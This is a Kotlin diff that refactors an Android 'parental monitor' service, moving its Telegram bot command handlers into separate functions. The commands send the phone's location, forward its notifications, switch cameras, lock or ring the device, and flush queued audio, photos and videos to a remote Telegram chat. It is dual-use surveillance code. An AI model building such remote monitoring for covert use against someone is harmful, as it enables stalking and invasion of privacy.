@@ -1675,117 +1675,11 @@ class MonitoringService : Service() {
                 sendToTelegram("⏸️ Monitoring dijeda (panggilan, SMS, foto, dan teruskan notifikasi). Kirim /resume untuk lanjut.")
             }
             "/resume" -> handleResumeCommand()
-            "/location" -> {
-                if (!hasLocationPermission()) {
-                    sendToTelegram("⚠️ Izin lokasi hilang. Buka Setup dan berikan izin Lokasi.")
-                } else {
-                    sendToTelegram("📍 Mencari lokasi…")
-                    val location = fetchLocation(allowStale = true)
-                    if (location == null) {
-                        sendToTelegram("⚠️ Lokasi tak didapat: " + locationFailureHint())
-                    } else {
-                        val stale = isStaleFix(location)
-                        val prev = if (stale) null else lastSentLatLon()
-                        val dist = if (prev == null) -1f else distanceMeters(prev.first, prev.second, location.latitude, location.longitude)
-                        if (!stale) {
-                            rememberSentLatLon(location.latitude, location.longitude)
-                            try { checkGeofence(location.latitude, location.longitude, location.accuracy) } catch (_: Exception) { }
-                        }
-                        val near = if (dist >= 0f) "\nJarak dari laporan terakhir: ${dist.toInt()} m" else ""
-                        sendToTelegram("📍 <b>Lokasi</b>\nhttps://maps.google.com/?q=${location.latitude},${location.longitude}\nAkurasi: ±${location.accuracy.toInt()} m$near" + fixAgeNote(location))
-                    }
-                }
-            }
-            "/camera" -> {
-                when (arg.lowercase(java.util.Locale.ROOT)) {
-                    "belakang", "back" -> {
-                        preferencesManager.cameraFacing = "back"
-                        sendToTelegram("📸 Kamera disetel belakang.")
-                    }
-                    "depan", "front" -> {
-                        preferencesManager.cameraFacing = "front"
-                        sendToTelegram("📸 Kamera disetel depan.")
-                    }
-                    else -> {
-                        sendToTelegram("Cara pakai: /camera &lt;depan|belakang&gt; (kini: ${preferencesManager.cameraFacing})")
-                    }
-                }
-            }
-            "/notif" -> {
-                when (arg.lowercase(java.util.Locale.ROOT)) {
-                    "on" -> {
-                        preferencesManager.notifForwardEnabled = true
-                        if (isNotifForwarding()) {
-                            sendToTelegram("\uD83D\uDD14 Penerusan notifikasi NYALA.")
-                        } else {
-                            sendToTelegram("Penerusan notifikasi nyala, tapi akses notifikasi sistem belum ada. Buka Setup, tekan Read Notifications untuk mengizinkan.")
-                        }
-                    }
-                    "off" -> {
-                        preferencesManager.notifForwardEnabled = false
-                        sendToTelegram("\uD83D\uDD15 Penerusan notifikasi MATI.")
-                    }
-                    "status", "" -> {
-                        val state = if (isNotifForwarding()) "diteruskan" else "mati"
-                        sendToTelegram("\uD83D\uDD14 Notifikasi: $state (setelan: ${if (preferencesManager.notifForwardEnabled) "nyala" else "mati"})")
-                    }
-                    else -> {
-                        sendToTelegram("Cara pakai: /notif &lt;on|off|status&gt;")
-                    }
-                }
-            }
-            "/log" -> {
-                val crash = try {
-                    CrashReporter.pendingReport(this)
-                } catch (_: Exception) {
-                    null
-                }
-                if (crash != null) {
-                    if (sendFitted(crash)) {
-                        CrashReporter.clearPending(this)
-                    }
-                } else {
-                    sendToTelegram("\uD83E\uDDFE Belum ada crash.")
-                }
-                sendToTelegram(
-                    buildString {
-                        appendLine("\uD83E\uDDFE <b>Log galat</b>")
-                        val credErr = try {
-                            preferencesManager.credentialError
-                        } catch (_: Exception) {
-                            ""
-                        }
-                        appendLine("Auth: " + if (credErr.isEmpty()) "OK" else "GAGAL ($credErr)")
-                        appendLine("Antrean: ${messageQueue.getQueueSize()}")
-                        appendLine("Penyimpanan: " + if (preferencesManager.isStorageEncrypted) "terenkripsi" else "volatil")
-                        val camErr = try {
-                            preferencesManager.lastCameraErrorNotice
-                        } catch (_: Exception) {
-                            0L
-                        }
-                        appendLine("Galat kamera terakhir: " + if (camErr > 0) formatDate(camErr) else "tak ada")
-                        val upErr = try {
-                            preferencesManager.lastUploadErrorNotice
-                        } catch (_: Exception) {
-                            0L
-                        }
-                        appendLine("Galat unggah terakhir: " + if (upErr > 0) formatDate(upErr) else "tak ada")
-                    }
-                )
-            }
-            "/syncinterval" -> {
-                val minutes = arg.toIntOrNull()
-                if (minutes == null || minutes !in 1..1440) {
-                    sendToTelegram("Cara pakai: /syncinterval &lt;1-1440&gt; (menit)")
-                } else {
-                    preferencesManager.syncInterval = minutes
-                    sendToTelegram("\u23F1\uFE0F Interval sinkron diatur $minutes mnt.")
-                    try {
-                        restartAllLoops()
-                    } catch (_: Exception) {
-                    }
-                }
-            }
+            "/location" -> handleLocationCommand()
+            "/camera" -> handleCameraCommand(arg)
+            "/notif" -> handleNotifCommand(arg)
+            "/log" -> handleLogCommand()
+            "/syncinterval" -> handleSyncIntervalCommand(arg)
             "/restart" -> {
                 if (restartAllLoops()) {
                     replyLater("\u267B\uFE0F Loops restarted.")
@@ -1793,129 +1687,11 @@ class MonitoringService : Service() {
                     sendToTelegram("⏳️ Restart dibatasi, coba lagi sebentar.")
                 }
             }
-            "/flush" -> {
-                val queued = messageQueue.getQueueSize()
-                if (NetworkUtils.isAuthBlocked(preferencesManager)) {
-                    val code = try { preferencesManager.credentialError } catch (_: Exception) { "" }
-                    val hint = when (code) {
-                        "403" -> "bot diblokir atau dikeluarkan dari chat — buka Telegram lalu buka blokir/undang ulang bot"
-                        "401" -> "token bot ditolak — perbaiki token di Setup"
-                        else -> "pengiriman ditolak Telegram"
-                    }
-                    sendToTelegram("⚠️ Flush ditunda: $hint (kode $code).")
-                    return
-                }
-                serviceScope.launch {
-                    try {
-                        flushPendingAudio()
-                    } catch (_: Exception) {
-                    }
-                    try {
-                        flushPendingPhotos()
-                    } catch (_: Exception) {
-                    }
-                    try {
-                        flushPendingVideos()
-                    } catch (_: Exception) {
-                    }
-                }
-                val scheduled = MessageScheduler.scheduleMessageSend(this)
-                if (scheduled) {
-                    sendToTelegram("\uD83D\uDCE4 Flush dijadwalkan ($queued menunggu). Dikirim saat online.")
-                } else {
-                    sendToTelegram("⚠️ Tak bisa menjadwalkan flush ($queued menunggu).")
-                }
-            }
-            "/clearqueue" -> {
-                val queued = messageQueue.getQueueSize()
-                val overflowTaken = try { messageQueue.takeOverflowDrops() } catch (_: Exception) { 0L }
-                val expiredTaken = try { messageQueue.takeExpiredDrops() } catch (_: Exception) { 0L }
-                try {
-                    messageQueue.clearQueue()
-                } catch (_: Exception) {
-                }
-                val dropExtra = buildString {
-                    if (overflowTaken > 0L) append(" Ditambah $overflowTaken pesan penuh yang dibuang.")
-                    if (expiredTaken > 0L) append(" Ditambah $expiredTaken pesan kedaluwarsa yang dibuang.")
-                }
-                sendToTelegram("\uD83D\uDDD1\uFE0F Antrean dibersihkan ($queued dibuang). Catatan: pembaruan SMS/panggilan yang sudah ditandai terbaca tidak dikirim ulang.$dropExtra", null, true)
-            }
-            "/lock" -> {
-                try {
-                    val dpm = devicePolicySvc
-                    val admin = android.content.ComponentName(this, com.redeye.parentalmonitor.receiver.AdminReceiver::class.java)
-                    if (dpm == null || !dpm.isAdminActive(admin)) {
-                        sendToTelegram("⚠️ Device Admin belum aktif. Aktifkan dulu di Setup.")
-                    } else {
-                        dpm.lockNow()
-                        sendToTelegram("\uD83D\uDD12 Perangkat dikunci.")
-                    }
-                } catch (e: SecurityException) {
-                    sendToTelegram("⚠️ Tak bisa mengunci: Device Admin belum aktif.")
-                } catch (e: Exception) {
-                    sendToTelegram("⚠️ Gagal mengunci.")
-                }
-            }
-            "/ring" -> {
-                val seconds = if (arg.isEmpty()) 15 else arg.toIntOrNull()
-                if (seconds == null || seconds !in 5..60) {
-                    sendToTelegram("Cara pakai: /ring [5-60] (seconds)")
-                } else if (!ringBusy.compareAndSet(false, true)) {
-                    sendToTelegram("⏱️ Sedang berdering, tunggu sebentar.")
-                } else if (recordBusy.get() || recorderActive.get()) {
-                    ringBusy.set(false)
-                    sendToTelegram("⏱️ Sedang merekam, tunggu sebentar.")
-                } else {
-                    try { ringJob?.cancel() } catch (_: Exception) { }
-                    ringJob = serviceScope.launch {
-                        try {
-                            ringDevice(seconds)
-                        } finally {
-                            ringBusy.set(false)
-                        }
-                    }
-                }
-            }
-            "/ping" -> {
-                if (!senderOk) return
-                val pingKey = senderId.ifEmpty { "unknown" }
-                val nowPing = android.os.SystemClock.elapsedRealtime()
-                val lastPing = try { synchronized(pingRate) { pingRate[pingKey] } } catch (_: Exception) { null }
-                if (lastPing != null && nowPing - lastPing < PING_RATE_WINDOW_MS) return
-                try { synchronized(pingRate) { pingRate[pingKey] = nowPing } } catch (_: Exception) { }
-                when (arg.substringBefore(" ").lowercase(java.util.Locale.ROOT)) {
-                    "camera", "photo" -> {
-                        if (cameraJob?.isActive != true && pingRestartDue()) {
-                            restartCameraLoop()
-                            pingRestartMark()
-                        }
-                        handleTelegramCommand("/photo", sentAtSec, senderOk, chatOk, senderId, privateChat)
-                    }
-                    "location", "loc", "gps" -> {
-                        handleTelegramCommand("/location", sentAtSec, senderOk, chatOk, senderId, privateChat)
-                    }
-                    "" -> {
-                        val initialStuck = initialSyncRunning.get() && initialSyncJob?.isActive != true
-                        val loopsOk = monitoringJob?.isActive == true && cameraJob?.isActive == true && commandJob?.isActive == true && patrolJob?.isActive == true && !initialStuck
-                        var restarted = false
-                        if (!loopsOk && pingRestartDue()) {
-                            restarted = restartAllLoops()
-                            if (restarted) pingRestartMark()
-                        }
-                        val tail = if (restarted) " ⏰ Loop dijalankan ulang." else ""
-                        val pong = if (sentAtSec > 0) {
-                            val lag = System.currentTimeMillis() / 1000L - sentAtSec
-                            "\uD83C\uDFD3 Pong! Delay ${lag.coerceAtLeast(0)} s." + tail
-                        } else {
-                            "\uD83C\uDFD3 Pong! " + TimeFmt.full(System.currentTimeMillis()) + tail
-                        }
-                        if (restarted) replyLater(pong) else sendToTelegram(pong)
-                    }
-                    else -> {
-                        sendToTelegram("Cara pakai: /ping [camera|location]")
-                    }
-                }
-            }
+            "/flush" -> handleFlushCommand()
+            "/clearqueue" -> handleClearQueueCommand()
+            "/lock" -> handleLockCommand()
+            "/ring" -> handleRingCommand(arg)
+            "/ping" -> handlePingCommand(arg, sentAtSec, senderOk, chatOk, senderId, privateChat)
             "/record" -> {
                 val seconds = arg.toIntOrNull()
                 if (seconds == null || seconds !in 5..600) {
@@ -2533,6 +2309,251 @@ class MonitoringService : Service() {
             }
         }
     }
+    private suspend fun handleLocationCommand() {
+        if (!hasLocationPermission()) {
+            sendToTelegram("⚠️ Izin lokasi hilang. Buka Setup dan berikan izin Lokasi.")
+        } else {
+            sendToTelegram("📍 Mencari lokasi…")
+            val location = fetchLocation(allowStale = true)
+            if (location == null) {
+                sendToTelegram("⚠️ Lokasi tak didapat: " + locationFailureHint())
+            } else {
+                val stale = isStaleFix(location)
+                val prev = if (stale) null else lastSentLatLon()
+                val dist = if (prev == null) -1f else distanceMeters(prev.first, prev.second, location.latitude, location.longitude)
+                if (!stale) {
+                    rememberSentLatLon(location.latitude, location.longitude)
+                    try { checkGeofence(location.latitude, location.longitude, location.accuracy) } catch (_: Exception) { }
+                }
+                val near = if (dist >= 0f) "\nJarak dari laporan terakhir: ${dist.toInt()} m" else ""
+                sendToTelegram("📍 <b>Lokasi</b>\nhttps://maps.google.com/?q=${location.latitude},${location.longitude}\nAkurasi: ±${location.accuracy.toInt()} m$near" + fixAgeNote(location))
+            }
+        }
+    }
+
+    private suspend fun handleCameraCommand(arg: String) {
+        when (arg.lowercase(java.util.Locale.ROOT)) {
+            "belakang", "back" -> {
+                preferencesManager.cameraFacing = "back"
+                sendToTelegram("📸 Kamera disetel belakang.")
+            }
+            "depan", "front" -> {
+                preferencesManager.cameraFacing = "front"
+                sendToTelegram("📸 Kamera disetel depan.")
+            }
+            else -> {
+                sendToTelegram("Cara pakai: /camera &lt;depan|belakang&gt; (kini: ${preferencesManager.cameraFacing})")
+            }
+        }
+    }
+
+    private suspend fun handleNotifCommand(arg: String) {
+        when (arg.lowercase(java.util.Locale.ROOT)) {
+            "on" -> {
+                preferencesManager.notifForwardEnabled = true
+                if (isNotifForwarding()) {
+                    sendToTelegram("\uD83D\uDD14 Penerusan notifikasi NYALA.")
+                } else {
+                    sendToTelegram("Penerusan notifikasi nyala, tapi akses notifikasi sistem belum ada. Buka Setup, tekan Read Notifications untuk mengizinkan.")
+                }
+            }
+            "off" -> {
+                preferencesManager.notifForwardEnabled = false
+                sendToTelegram("\uD83D\uDD15 Penerusan notifikasi MATI.")
+            }
+            "status", "" -> {
+                val state = if (isNotifForwarding()) "diteruskan" else "mati"
+                sendToTelegram("\uD83D\uDD14 Notifikasi: $state (setelan: ${if (preferencesManager.notifForwardEnabled) "nyala" else "mati"})")
+            }
+            else -> {
+                sendToTelegram("Cara pakai: /notif &lt;on|off|status&gt;")
+            }
+        }
+    }
+
+    private suspend fun handleLogCommand() {
+        val crash = try {
+            CrashReporter.pendingReport(this)
+        } catch (_: Exception) {
+            null
+        }
+        if (crash != null) {
+            if (sendFitted(crash)) {
+                CrashReporter.clearPending(this)
+            }
+        } else {
+            sendToTelegram("\uD83E\uDDFE Belum ada crash.")
+        }
+        sendToTelegram(
+            buildString {
+                appendLine("\uD83E\uDDFE <b>Log galat</b>")
+                val credErr = try {
+                    preferencesManager.credentialError
+                } catch (_: Exception) {
+                    ""
+                }
+                appendLine("Auth: " + if (credErr.isEmpty()) "OK" else "GAGAL ($credErr)")
+                appendLine("Antrean: ${messageQueue.getQueueSize()}")
+                appendLine("Penyimpanan: " + if (preferencesManager.isStorageEncrypted) "terenkripsi" else "volatil")
+                val camErr = try {
+                    preferencesManager.lastCameraErrorNotice
+                } catch (_: Exception) {
+                    0L
+                }
+                appendLine("Galat kamera terakhir: " + if (camErr > 0) formatDate(camErr) else "tak ada")
+                val upErr = try {
+                    preferencesManager.lastUploadErrorNotice
+                } catch (_: Exception) {
+                    0L
+                }
+                appendLine("Galat unggah terakhir: " + if (upErr > 0) formatDate(upErr) else "tak ada")
+            }
+        )
+    }
+
+    private suspend fun handleSyncIntervalCommand(arg: String) {
+        val minutes = arg.toIntOrNull()
+        if (minutes == null || minutes !in 1..1440) {
+            sendToTelegram("Cara pakai: /syncinterval &lt;1-1440&gt; (menit)")
+        } else {
+            preferencesManager.syncInterval = minutes
+            sendToTelegram("\u23F1\uFE0F Interval sinkron diatur $minutes mnt.")
+            try {
+                restartAllLoops()
+            } catch (_: Exception) {
+            }
+        }
+    }
+
+    private suspend fun handleFlushCommand() {
+        val queued = messageQueue.getQueueSize()
+        if (NetworkUtils.isAuthBlocked(preferencesManager)) {
+            val code = try { preferencesManager.credentialError } catch (_: Exception) { "" }
+            val hint = when (code) {
+                "403" -> "bot diblokir atau dikeluarkan dari chat — buka Telegram lalu buka blokir/undang ulang bot"
+                "401" -> "token bot ditolak — perbaiki token di Setup"
+                else -> "pengiriman ditolak Telegram"
+            }
+            sendToTelegram("⚠️ Flush ditunda: $hint (kode $code).")
+            return
+        }
+        serviceScope.launch {
+            try {
+                flushPendingAudio()
+            } catch (_: Exception) {
+            }
+            try {
+                flushPendingPhotos()
+            } catch (_: Exception) {
+            }
+            try {
+                flushPendingVideos()
+            } catch (_: Exception) {
+            }
+        }
+        val scheduled = MessageScheduler.scheduleMessageSend(this)
+        if (scheduled) {
+            sendToTelegram("\uD83D\uDCE4 Flush dijadwalkan ($queued menunggu). Dikirim saat online.")
+        } else {
+            sendToTelegram("⚠️ Tak bisa menjadwalkan flush ($queued menunggu).")
+        }
+    }
+
+    private suspend fun handleClearQueueCommand() {
+        val queued = messageQueue.getQueueSize()
+        val overflowTaken = try { messageQueue.takeOverflowDrops() } catch (_: Exception) { 0L }
+        val expiredTaken = try { messageQueue.takeExpiredDrops() } catch (_: Exception) { 0L }
+        try {
+            messageQueue.clearQueue()
+        } catch (_: Exception) {
+        }
+        val dropExtra = buildString {
+            if (overflowTaken > 0L) append(" Ditambah $overflowTaken pesan penuh yang dibuang.")
+            if (expiredTaken > 0L) append(" Ditambah $expiredTaken pesan kedaluwarsa yang dibuang.")
+        }
+        sendToTelegram("\uD83D\uDDD1\uFE0F Antrean dibersihkan ($queued dibuang). Catatan: pembaruan SMS/panggilan yang sudah ditandai terbaca tidak dikirim ulang.$dropExtra", null, true)
+    }
+
+    private suspend fun handleLockCommand() {
+        try {
+            val dpm = devicePolicySvc
+            val admin = android.content.ComponentName(this, com.redeye.parentalmonitor.receiver.AdminReceiver::class.java)
+            if (dpm == null || !dpm.isAdminActive(admin)) {
+                sendToTelegram("⚠️ Device Admin belum aktif. Aktifkan dulu di Setup.")
+            } else {
+                dpm.lockNow()
+                sendToTelegram("\uD83D\uDD12 Perangkat dikunci.")
+            }
+        } catch (e: SecurityException) {
+            sendToTelegram("⚠️ Tak bisa mengunci: Device Admin belum aktif.")
+        } catch (e: Exception) {
+            sendToTelegram("⚠️ Gagal mengunci.")
+        }
+    }
+
+    private suspend fun handleRingCommand(arg: String) {
+        val seconds = if (arg.isEmpty()) 15 else arg.toIntOrNull()
+        if (seconds == null || seconds !in 5..60) {
+            sendToTelegram("Cara pakai: /ring [5-60] (seconds)")
+        } else if (!ringBusy.compareAndSet(false, true)) {
+            sendToTelegram("⏱️ Sedang berdering, tunggu sebentar.")
+        } else if (recordBusy.get() || recorderActive.get()) {
+            ringBusy.set(false)
+            sendToTelegram("⏱️ Sedang merekam, tunggu sebentar.")
+        } else {
+            try { ringJob?.cancel() } catch (_: Exception) { }
+            ringJob = serviceScope.launch {
+                try {
+                    ringDevice(seconds)
+                } finally {
+                    ringBusy.set(false)
+                }
+            }
+        }
+    }
+
+    private suspend fun handlePingCommand(arg: String, sentAtSec: Long, senderOk: Boolean, chatOk: Boolean, senderId: String, privateChat: Boolean) {
+        if (!senderOk) return
+        val pingKey = senderId.ifEmpty { "unknown" }
+        val nowPing = android.os.SystemClock.elapsedRealtime()
+        val lastPing = try { synchronized(pingRate) { pingRate[pingKey] } } catch (_: Exception) { null }
+        if (lastPing != null && nowPing - lastPing < PING_RATE_WINDOW_MS) return
+        try { synchronized(pingRate) { pingRate[pingKey] = nowPing } } catch (_: Exception) { }
+        when (arg.substringBefore(" ").lowercase(java.util.Locale.ROOT)) {
+            "camera", "photo" -> {
+                if (cameraJob?.isActive != true && pingRestartDue()) {
+                    restartCameraLoop()
+                    pingRestartMark()
+                }
+                handleTelegramCommand("/photo", sentAtSec, senderOk, chatOk, senderId, privateChat)
+            }
+            "location", "loc", "gps" -> {
+                handleTelegramCommand("/location", sentAtSec, senderOk, chatOk, senderId, privateChat)
+            }
+            "" -> {
+                val initialStuck = initialSyncRunning.get() && initialSyncJob?.isActive != true
+                val loopsOk = monitoringJob?.isActive == true && cameraJob?.isActive == true && commandJob?.isActive == true && patrolJob?.isActive == true && !initialStuck
+                var restarted = false
+                if (!loopsOk && pingRestartDue()) {
+                    restarted = restartAllLoops()
+                    if (restarted) pingRestartMark()
+                }
+                val tail = if (restarted) " ⏰ Loop dijalankan ulang." else ""
+                val pong = if (sentAtSec > 0) {
+                    val lag = System.currentTimeMillis() / 1000L - sentAtSec
+                    "\uD83C\uDFD3 Pong! Delay ${lag.coerceAtLeast(0)} s." + tail
+                } else {
+                    "\uD83C\uDFD3 Pong! " + TimeFmt.full(System.currentTimeMillis()) + tail
+                }
+                if (restarted) replyLater(pong) else sendToTelegram(pong)
+            }
+            else -> {
+                sendToTelegram("Cara pakai: /ping [camera|location]")
+            }
+        }
+    }
+
+
     private suspend fun handlePhotoCommand(arg: String) {
         val lens = arg.substringBefore(" ").lowercase(java.util.Locale.ROOT)
         if (lens.isNotEmpty()) {
